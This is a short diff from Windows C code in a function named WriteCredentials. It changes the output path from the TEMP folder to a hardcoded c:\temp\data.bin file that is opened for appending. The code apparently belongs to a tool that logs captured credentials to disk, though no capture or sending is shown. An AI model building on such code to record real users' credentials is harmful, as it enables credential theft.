@@ -25,7 +25,10 @@ VOID WriteCredentials() {
 	TCHAR TempFolder[MAX_PATH];
 	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
 	TCHAR Path[MAX_PATH];
-	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
+	
+	StringCbPrintf(Path, MAX_PATH, L"c:\\temp\\data.bin");
+	//StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
+	
 	HANDLE hFile = CreateFile(Path, FILE_APPEND_DATA,  0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	WCHAR  DataBuffer[cbBuffer];
 	memset(DataBuffer, 0x00, cbBuffer);
